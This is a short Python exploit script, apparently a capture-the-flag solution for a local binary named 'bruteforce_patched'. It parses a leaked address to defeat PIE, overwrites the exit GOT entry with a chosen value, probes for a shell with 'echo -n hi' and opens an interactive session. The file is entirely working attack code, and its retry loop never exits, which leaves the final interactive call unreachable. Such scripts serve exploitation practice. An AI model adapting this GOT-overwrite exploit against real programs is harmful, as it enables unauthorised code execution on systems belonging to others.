#!/usr/bin/env python3

from flashlib import *

gdbscript = """
    brva 0x127f
"""

init("./bruteforce_patched", aslr=False)
# io.close()

def exploiter(io, output: str = None, **kwargs):
    raw = io.recvafter(b": ")
    print(f"Raw: {raw}")
    elf.address = int(raw) - elf.sym.win
    logleak(elf.address)
    try:
        io.sendlineafter(b": ", encode(elf.got.exit))
        io.sendlineafter(b": ", encode(0x51c9))
        if not output:
            """
            If no output function is defined:
            """
            io.sendline(b"echo -n hi")
            io.recvuntil(b"hi", timeout=2)
        else:
            """
            We wait until we receive this string
            """
            io.recvuntil(encode(output), timeout=2)
        return True
    except Exception as E:
        print(f"Error: {E}")
        io.close()
        return False


while True:
    io = get_ctx()
    exploiter(io)

# io = bruteforcer(exploiter)
io.interactive()